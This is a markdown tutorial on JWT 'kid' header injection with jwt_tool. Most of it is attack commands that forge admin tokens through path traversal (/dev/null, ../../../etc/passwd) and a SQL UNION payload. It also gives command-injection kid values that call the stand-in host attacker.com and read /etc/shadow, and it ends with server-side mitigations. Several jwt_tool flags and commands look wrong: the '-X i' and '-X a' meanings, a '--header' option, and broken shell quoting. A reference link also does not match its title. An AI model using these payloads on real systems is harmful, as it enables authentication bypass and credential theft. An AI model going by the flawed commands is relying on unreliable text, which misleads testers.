---
title: JWT Kid Parameter Injection Testing with jwt_tool
description: A comprehensive guide to exploiting and mitigating JWT kid (Key ID) header injection attacks using the jwt_tool security toolkit.
created: 2026-06-22
tags:
  - jwt
  - security
  - vulnerability
  - injection
  - jwt_tool
  - testing
status: draft
---

# JWT Kid Parameter Injection Testing with jwt_tool

## What is JWT Kid Injection?

The `kid` (Key ID) is an optional header parameter defined in RFC 7515 that helps the server identify which cryptographic key should be used to verify the JWT signature. When an application dynamically retrieves the verification key based on the unsanitized `kid` value supplied by the attacker, it opens the door to several critical attacks:

- **Path Traversal** – The attacker sets `kid` to an arbitrary file path (e.g., `/dev/null`, `../../etc/passwd`). The server reads that file and uses its raw contents as the HMAC secret, allowing signature forgery.
- **SQL Injection** – If the key is fetched from a database (e.g., `SELECT key FROM keys WHERE kid='$kid'`), an attacker can inject SQL to return a controlled value.
- **Command Injection / SSRF** – Rare, but occurs when `kid` is passed unsanitized into a shell command or outbound HTTP request.

## Why It Matters

A successful `kid` injection completely bypasses JWT authentication, allowing an attacker to:
- Forge tokens with arbitrary payloads (e.g., `"role":"admin"`)
- Escalate privileges without any valid credentials
- Take over user accounts or administrative panels

This vulnerability has been responsible for multiple CVEs and remains a staple in modern web application security assessments and CTF challenges.

## Introducing jwt_tool

`jwt_tool` is a powerful open-source toolkit for auditing, testing, and forging JSON Web Tokens. It automates many common JWT attacks, including algorithm confusion, `kid` injection, payload tampering, and signature verification bypass. Developed by [ticarpi](https://github.com/ticarpi/jwt_tool), it is widely used by penetration testers and security researchers.

## Installation

### Option 1: Clone from GitHub (recommended)

```bash
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
python3 -m pip install -r requirements.txt
```

Make the tool executable:

```bash
chmod +x jwt_tool.py
```

### Option 2: Install via pip (if available)

```bash
pip install jwt-tool
```

> **Note:** The GitHub version is updated more frequently. Always pull the latest if running from source.

## Basic Usage

`jwt_tool` can be invoked as a command-line tool with a target JWT. The general syntax is:

```bash
python3 jwt_tool.py <jwt_token> [options]
```

For interactive scanning:

```bash
python3 jwt_tool.py <jwt_token> -t
```

## Exploiting Kid Injection with jwt_tool

### 1. Path Traversal via Kid (Most Common)

The classic attack: set `kid` to `/dev/null` or any known file, and sign the token with an empty string or the file contents.

**Step 1 – Scan the JWT and identify the kid parameter**

```bash
python3 jwt_tool.py "eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQifQ.eyJzdWIiOiJ1c2VyIiwicm9sZSI6Im1lbWJlciJ9.sjKl7FhBfJ9J3wC6eVkIo4m7kA9nN3g"
```

The output will highlight header and payload claims, including `kid`.

**Step 2 – Forge a token with kid injection**

`jwt_tool` provides the `-X i` flag for `kid` injection attacks. Use `-I` to edit the payload and `-pv` to set a new value.

```bash
python3 jwt_tool.py "eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQifQ.eyJzdWIiOiJ1c2VyIiwicm9sZSI6Im1lbWJlciJ9.sjKl7FhBfJ9J3wC6eVkIo4m7kA9nN3g" \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "/dev/null"
```

**Explanation:**
- `-I` : interactively modify payload claims.
- `-pc "role" -pv "admin"` : change the `role` claim to `"admin"`.
- `-X i` : perform `kid` injection.
- `-k "/dev/null"` : use `/dev/null` as the key file. `jwt_tool` signs the token using the contents of that file (empty string for `/dev/null`).

The tool outputs a new, forged JWT that the server will accept if it reads `/dev/null` as the verification key.

**Alternative: Using `/etc/passwd` as the secret**

```bash
python3 jwt_tool.py <original_token> \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "../../../etc/passwd"
```

When the server reads `/etc/passwd`, it uses its entire content as the HMAC secret. `jwt_tool` automatically signs with that content.

### 2. SQL Injection via Kid

If the server queries a database for the key using the `kid` value, you can inject a SQL payload to return a known value.

**Example:** Craft a token with `kid` set to:

```json
{
  "alg": "HS256",
  "kid": " ' UNION SELECT 'known_secret' -- "
}
```

`jwt_tool` does not have a built-in SQL injection automatism, but you can manually craft the header and then sign it using `-X i` with a custom key.

**Manual forging with custom header:**

```bash
python3 jwt_tool.py <base_jwt> \
  -X i \
  -k "known_secret" \
  --header '{"alg":"HS256","kid":"' UNION SELECT 'known_secret' -- "}'
```

Then adjust the payload with `-I` as needed.

### 3. Command Injection via Kid

Rare but possible when `kid` is interpolated into a shell command, e.g.:

```
curl https://keyserver.example.com/keys/$(kid)
```

Set `kid` to a command injection payload:

```json
"kid": "$(curl -s http://attacker.com/steal?)"
```

`jwt_tool` can include arbitrary header values:

```bash
python3 jwt_tool.py <jwt> \
  --header '{"alg":"RS256","kid":"$(cat /etc/shadow | base64)"}' \
  -X i -k dummy_secret
```

> **Note:** Exploitation depends on the server's runtime environment and the way `kid` is processed.

## Key Features of jwt_tool for Kid Injection

| Feature | Command / Flag | Description |
|---------|---------------|-------------|
| Kid injection attack | `-X i` | Automates the process of setting a forged `kid` and signing with a file-based secret. |
| Algorithm confusion | `-X a` | Combined with `-X i` for hybrid attacks (switch from RS256 to HS256 after obtaining the public key). |
| Payload tampering | `-I` / `-pc` / `-pv` | Interactively or non-interactively modify any claim. |
| Custom key file | `-k <file>` | Specify the file whose contents will be used as the HMAC secret when forging. |
| Signature mismatch analysis | `-S` / `-s` | Check token behavior with altered signatures. |
| Database of known JWT secrets | `-C` | Attempt common weak secrets during brute‑force. |
| Advanced header manipulation | `--header` | Insert arbitrary JSON into the header (useful for raw `kid` payloads). |

## Putting It All Together: Full Exploitation Scenario

Consider a vulnerable API that uses JWT for authentication. The server fetches the verification key by reading the file specified in `kid`:

```python
# Vulnerable pseudocode
def verify_token(token):
    header = decode_header(token)
    kid = header['kid']
    with open('/keys/' + kid, 'r') as f:
        secret = f.read()
    return jwt.decode(token, secret, algorithms=['HS256'])
```

**Step 1 – Reconnaissance**

```bash
python3 jwt_tool.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6ImNsaWVudCJ9.eyJzdWIiOiJ1c2VyIn0.QPx..."
```

Output shows `alg: RS256`, `kid: client`.

**Step 2 – Check if path traversal is possible**

Attempt to access `/dev/null`:

```bash
python3 jwt_tool.py <token> -X i -k /dev/null
```

If the server returns a 200 response with the forged token, the vulnerability is confirmed.

**Step 3 – Escalate privileges**

```bash
# Forge token with admin role
python3 jwt_tool.py <original> \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "/dev/null"
```

**Step 4 – Use the forged token to access protected resources**

```bash
curl -H "Authorization: Bearer <forged_token>" https://api.target.com/admin
```

## Mitigation Strategies (Server-Side)

1. **Whitelist Allowed Kid Values** – Hardcode a mapping of known `kid` strings to their corresponding public keys. Never derive the key from user input.

2. **Validate Kid Format** – If dynamic lookup is unavoidable, enforce strict format checks: alphanumeric only, reject path separators (`.` , `/`), reject suspicious characters.

3. **Use Hardcoded Keys** – The safest approach is to embed the expected public key in the application code or a configuration file.

4. **Enforce Algorithm Enforcement** – Always verify that the algorithm used in the token matches the expected algorithm for that issuer. Do not trust the `alg` header.

5. **Employ a JWT Library with Built-in Protection** – Modern libraries like `PyJWT`, `jsonwebtoken`, and `jose` can be configured to reject unknown `kid` values or require a static key set.

## Conclusion

`jwt_tool` is an indispensable tool for testing JWT `kid` injection vulnerabilities. It automates the most common exploitation paths and provides a clear, repeatable workflow for security testers. Understanding how to use its `-X i` and `-I` flags can mean the difference between a missed finding and a critical authentication bypass.

Always remember to treat `kid` as **untrusted input** on the server side. For developers, a few lines of input validation can eliminate an entire class of JWT attacks.

## References

- [github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
- [RFC 7515 – JSON Web Signature](https://datatracker.ietf.org/doc/html/rfc7515)
- [JWT Attacks (Part 4c): kid Header Injection](https://jwt.io/introduction/)
- [CVE-2018-0114](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114) – node-jsonwebtoken key confusion
- [PortSwigger JWT Kid Lab](https://portswigger.net/web-security/jwt)